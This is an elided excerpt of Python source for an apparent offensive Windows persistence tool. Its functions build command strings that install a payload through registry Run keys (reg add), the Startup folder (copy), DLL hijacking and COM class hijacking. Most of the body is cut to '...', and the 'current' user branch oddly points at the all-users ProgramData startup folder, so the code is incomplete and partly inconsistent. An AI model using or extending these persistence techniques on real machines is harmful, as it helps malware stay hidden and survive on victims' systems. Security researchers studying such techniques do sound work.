...
def create_registry_persistence(
    ...
    try:
        ...
        results["cmd_command"] = (
            f'reg add "{key}" /v "{results["value_name"]}" /t REG_SZ /d "{payload_path}" /f'
        )
...
def create_startup_folder_persistence(
    ...
    try:
        if user == "current":
            ...
            results["startup_path"] = (
                "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
            )

        # Copy command
        results["copy_command"] = (
            f'copy "{payload_path}" "{results["startup_path"]}\\{results["link_name"]}"'
        )
...
def create_dll_hijacking(
    dll_name: str, target_application: str, payload_dll_path: str
) -> Dict[str, Any]:
    """
...
def create_com_hijacking(clsid: str, payload_dll_path: str) -> Dict[str, Any]:
    ...
    try:
        ...
        results["registry_command"] = (
            f'reg add "{reg_path}" /ve /t REG_SZ /d "{payload_dll_path}" /f'
        )
